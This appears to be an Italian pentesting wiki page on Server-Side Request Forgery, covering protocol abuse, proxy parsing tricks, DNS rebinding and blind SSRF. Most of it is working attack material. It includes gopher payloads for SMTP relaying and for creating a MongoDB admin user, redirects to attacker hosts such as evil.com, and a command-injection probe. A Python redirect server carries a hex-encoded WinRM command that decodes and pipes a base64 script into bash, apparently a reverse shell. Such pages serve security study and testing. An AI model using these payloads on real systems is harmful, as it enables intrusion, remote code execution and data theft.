# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Una vulnerabilità di tipo **Server-side Request Forgery (SSRF)** si verifica quando un attaccante induce un'applicazione **server-side** a effettuare **HTTP requests** verso un dominio a sua scelta. Questa vulnerabilità espone il server a richieste esterne arbitrarie dirette dall'attaccante.

## Capture SSRF

La prima cosa da fare è catturare un'interazione SSRF generata da te. Per catturare un'interazione HTTP o DNS puoi usare strumenti come:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Bypass dei domini whitelisted

Di solito scoprirai che l'SSRF funziona solo in **certain whitelisted domains** o URL. Nella pagina seguente trovi una **compilazione di tecniche da provare per bypassare quella whitelist**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

Se il server è correttamente protetto potresti **bypassare tutte le restrizioni sfruttando un Open Redirect all'interno della pagina web**. Poiché la pagina permetterà **SSRF to the same domain** e probabilmente **seguirà i redirect**, puoi sfruttare l'**Open Redirect** per far sì che il server acceda a qualsiasi risorsa interna.\
Read more here: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protocolli

- **file://**
- Lo schema URL `file://` è citato, puntando direttamente a `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Lo schema URL DICT viene descritto come utilizzato per accedere a definizioni o liste di parole tramite il protocollo DICT. L'esempio mostra un URL costruito che mira a una parola specifica, database e numero di voce, e un caso in cui uno script PHP potrebbe essere abusato per connettersi a un server DICT usando credenziali fornite dall'attaccante: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Identificato come protocollo per il trasferimento file sicuro su secure shell, viene fornito un esempio che mostra come uno script PHP potrebbe essere sfruttato per connettersi a un server SFTP malevolo: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, che opera su UDP, è menzionato con un esempio di uno script PHP progettato per inviare una richiesta a un server TFTP. Una richiesta TFTP viene effettuata a 'generic.com' sulla porta '12346' per il file 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Questo segmento tratta il Lightweight Directory Access Protocol, sottolineando il suo uso per gestire e accedere a servizi di informazioni di directory distribuite su reti IP. Interagisci con un LDAP server su localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Viene descritto un metodo per sfruttare vulnerabilità SSRF per interagire con servizi SMTP su localhost, inclusi passi per rivelare nomi di dominio interni e ulteriori azioni investigative basate su quelle informazioni.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Se la SSRF è eseguita da **curl**, curl ha una funzionalità chiamata [**URL globbing**](https://everything.curl.dev/cmdline/globbing) che potrebbe essere utile per bypassare i WAF. Per esempio in questo [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) puoi trovare questo esempio per un **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Viene spiegata la capacità del protocollo Gopher di specificare IP, port and bytes per la comunicazione con il server, insieme a strumenti come Gopherus e remote-method-guesser per creare payloads. Vengono illustrate due modalità d'uso distinte:

### Gopher://

Usando questo protocollo puoi specificare gli **IP, port and bytes** che vuoi che il server **invi**. Poi, puoi praticamente sfruttare una SSRF per **communicate with any TCP server** (ma devi prima sapere come parlare con il servizio).\
Fortunatamente, puoi usare [Gopherus](https://github.com/tarunkant/Gopherus) per creare payloads per diversi servizi. Inoltre, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) può essere usato per creare _gopher_ payloads per i servizi _Java RMI_.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect verso 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Crea un utente con username=admin, password=admin123 e permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Altri

I software di analytics sui server spesso registrano il Referrer header per tracciare i link in ingresso, una pratica che espone involontariamente le applicazioni a vulnerabilità di Server-Side Request Forgery (SSRF). Questo perché tali software possono visitare gli URL esterni menzionati nel Referrer header per analizzare il contenuto del sito di referral. Per scoprire queste vulnerabilità, si consiglia il plugin di Burp Suite "**Collaborator Everywhere**", sfruttando il modo in cui gli strumenti di analytics elaborano il Referer header per identificare potenziali superfici d'attacco SSRF.

## SSRF via dati SNI dal certificato

Una misconfigurazione che potrebbe consentire la connessione a qualsiasi backend tramite una semplice configurazione è illustrata con un esempio di configurazione Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
In questa configurazione, il valore del campo Server Name Indication (SNI) viene utilizzato direttamente come indirizzo del backend. Questa impostazione espone a una vulnerabilità Server-Side Request Forgery (SSRF), che può essere sfruttata semplicemente specificando l'indirizzo IP o il nome di dominio desiderato nel campo SNI. Un esempio di exploit per forzare una connessione verso un backend arbitrario, come `internal.host.com`, usando il comando `openssl`, è riportato di seguito:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF tramite TLS AIA CA Issuers (Java mTLS)

Alcune stack TLS effettueranno il download automatico delle CA intermedie mancanti usando la **Authority Information Access (AIA) → CA Issuers** URI presente nel certificato del peer. In **Java**, abilitare `-Dcom.sun.security.enableAIAcaIssuers=true` mentre si esegue un servizio mTLS fa sì che il server dereferenzi URI controllati dall'attaccante presenti nel certificato client **durante l'handshake**, prima che venga eseguita qualsiasi logica HTTP.

- **Requisiti**: mTLS abilitato, Java AIA fetching abilitato, l'attaccante può presentare un certificato client con un AIA CA Issuers URI creato ad arte.
- **Triggering SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
L'output di debug certpath di Java mostra `CertStore URI:http://localhost:8080`, e `nc` cattura la richiesta HTTP con il `User-Agent` controllabile da `-Dhttp.agent`, provando la SSRF durante la validazione del certificato.
- **DoS via file://**: impostare AIA CA Issuers su `file:///dev/urandom` su host Unix-like fa sì che Java lo tratti come un CertStore e legga byte casuali senza limiti, tenendo occupato un core CPU e bloccando connessioni successive anche dopo che il client si disconnette.

## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

It might be worth trying a payload like: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Rendering di PDF

If the web page is automatically creating a PDF with some information you have provided, you can **insert some JS that will be executed by the PDF creator** itself (the server) while creating the PDF and you will be able to abuse a SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

Crea diverse sessioni e prova a scaricare file pesanti sfruttando la SSRF dalle sessioni.

## SSRF PHP Functions

Controlla la seguente pagina per funzioni PHP vulnerabili e persino Wordpress:

{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

Per alcune exploitazioni potresti aver bisogno di **inviare una risposta di redirect** (potenzialmente per usare un protocollo diverso come gopher). Qui hai diversi codici python per rispondere con un redirect:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Proxy mal configurati per SSRF

Tricks [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Codice vulnerabile del proxy Flask</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask permette di usare **`@`** come carattere iniziale, il che permette di far sì che il **initial host name sia il username** e di iniettare un nuovo host. Richiesta d'attacco:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Codice vulnerabile:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

È stato scoperto che è possibile **iniziare il path** di una request con il carattere **`;`**, il che permette poi di usare **`@`** e iniettare un nuovo host da raggiungere. Richiesta di attacco:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### Server web integrato di PHP <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Codice PHP vulnerabile</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP permette l'uso del **carattere `*` prima di uno slash nel percorso** dell'URL, tuttavia ha altre limitazioni: può essere usato solo per il pathname root `/` e i punti `.` non sono permessi prima del primo slash, quindi è necessario usare, ad esempio, un indirizzo IP codificato in hex senza punti:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Se hai **problemi** a **exfiltrate content from a local IP** a causa di **CORS/SOP**, **DNS Rebidding** può essere usato per bypassare questa limitazione:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) è uno strumento per eseguire attacchi di [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). Include i componenti necessari per ricollegare l'IP del nome DNS del server dell'attaccante all'IP della macchina target e per servire payload di attacco per sfruttare software vulnerabili sulla macchina target.

Dai anche un'occhiata al **server pubblico in esecuzione su** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requisiti:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Attacco:

1. Chiedere all'utente/bot di **access** a un **domain** controllato dall'**attacker**
2. Il **TTL** del **DNS** è **0** sec (quindi la vittima ricontrollerà presto l'IP del dominio)
3. Viene creata una **TLS connection** tra la vittima e il dominio dell'attaccante. L'attaccante inserisce il **payload inside** il **Session ID o Session Ticket**.
4. Il **domain** inizierà un **infinite loop** di redirect verso se stesso. L'obiettivo è far sì che l'utente/bot acceda al dominio fino a quando non effettuerà di nuovo una **DNS request** per il dominio.
5. Nella richiesta DNS viene fornito **ora** un indirizzo IP privato (ad esempio 127.0.0.1)
6. L'utente/bot tenterà di **reestablish the TLS connection** e per farlo invierà il **Session** ID/Ticket ID (dove era contenuto il **payload** dell'attaccante). Quindi congratulazioni: sei riuscito a far sì che **user/bot attack himself**.

Nota che durante questo attacco, se vuoi attaccare localhost:11211 (_memcache_) devi far sì che la vittima stabilisca la connessione iniziale con www.attacker.com:11211 (la **porta deve essere sempre la stessa**).\
Per **perform this attack you can use the tool**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Per **more information** dai un'occhiata alla talk in cui questo attacco è spiegato: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

La differenza tra una blind SSRF e una non blind è che nella blind non puoi vedere la response della SSRF request. Quindi è più difficile da sfruttare perché potrai sfruttare solo vulnerabilità ben note.

### Time based SSRF

**Controllando il tempo** delle risposte dal server potrebbe essere **possibile sapere se una risorsa esiste o meno** (potrebbe richiedere più tempo accedere a una risorsa esistente rispetto ad una che non esiste)

### From blid to full abusing status codes

Secondo questo [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), alcune blind SSRF possono verificarsi perché anche se l'URL target risponde con uno status code 200 (come i metadata AWS), questi dati non sono formattati correttamente e quindi l'app potrebbe rifiutarsi di mostrarli.

Tuttavia, è stato scoperto che inviando alcune risposte di redirect con codici dal 305 al 309 nella SSRF potrebbe essere possibile far sì che l'applicazione **follow these redirects while entering an error mode** che non controllerà più il formato dei dati e potrebbe semplicemente stamparli.

Il server python usato per sfruttare questo è il seguente:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Passaggi:**
- Prima il 302 fa sì che l'app inizi a seguire.
- Poi riceve 305 → 306 → 307 → 308 → 309 → 310.
- Dopo il 5° codice strano il PoC finalmente restituisce 302 → 169.254.169.254 → 200 OK.

**Cosa succede all'interno del target:**
- libcurl stesso effettua il follow per 305–310; normalizza semplicemente i codici sconosciuti in “follow.”
- Dopo N redirect strani (≥ 5 qui) il wrapper dell'applicazione decide che “something is off” e passa in una modalità di errore pensata per il debugging.
- In quella modalità esegue un dump dell'intera catena di redirect più il body finale verso il chiamante esterno.
- Risultato: l'attacker vede ogni header + il metadata JSON, missione compiuta.

Nota che questo è interessante per ottenere il leak di status code che prima non potevi ottenere (come un 200). Tuttavia, se in qualche modo potessi anche selezionare lo status code della response (immagina di poter decidere che gli AWS metadata rispondano con uno status 500), **potrebbero esserci alcuni status code che rivelano direttamente il contenuto della response.**

### HTML-to-PDF renderers come gadget SSRF ciechi

Librerie come **TCPDF** (e wrapper come **spipu/html2pdf**) recuperano automaticamente qualsiasi URL presente in HTML controllato dall'attacker durante il rendering di un PDF. Ogni attributo `<img>` o `<link rel="stylesheet">` viene risolto lato server tramite cURL, `getimagesize()`, o `file_get_contents()`, quindi puoi indurre il worker PDF a sondare host interni anche se nessuna risposta HTTP viene riflessa a te.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 effettua diversi tentativi di recupero per ogni risorsa `<img>`, quindi un singolo payload può generare più richieste (utile per port scan basati sul timing).
- html2pdf copia il comportamento di TCPDF per `<img>` e aggiunge il recupero del CSS dentro `Css::extractStyle()`, che semplicemente chiama `file_get_contents($href)` dopo un controllo superficiale dello schema. Abusane per colpire servizi loopback, range RFC1918 o endpoint di metadata cloud.
- Combina questa primitiva SSRF con i [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) per leak sia le risposte HTTP interne sia i file locali renderizzati nel PDF.

Chi si occupa di hardening dovrebbe rimuovere gli URL esterni prima del rendering o isolare il renderer in una sandbox di rete; fino ad allora, considera i generatori di PDF come blind SSRF proxies.

## Sfruttamento SSRF nel cloud

Se trovi una vulnerabilità SSRF in una macchina che gira in un ambiente cloud potresti essere in grado di ottenere informazioni interessanti sull'ambiente cloud e persino credenziali:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## Piattaforme vulnerabili a SSRF

Diverse piattaforme note contengono o hanno contenuto vulnerabilità SSRF; consultale in:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Strumenti

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool to detect and exploit SSRF vulnerabilities

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

This tool generates Gopher payloads for:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ è uno scanner di vulnerabilità _Java RMI_ che supporta operazioni di attacco per le più comuni vulnerabilità _Java RMI_. La maggior parte delle operazioni disponibili supporta l'opzione `--ssrf` per generare un payload _SSRF_ per l'operazione richiesta. Insieme all'opzione `--gopher`, possono essere generati direttamente payload _gopher_ pronti all'uso.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy è un server proxy HTTP multi-thread progettato per tunnellare il traffico HTTP del client attraverso server HTTP vulnerabili a Server-Side Request Forgery (SSRF).

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Riferimenti

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
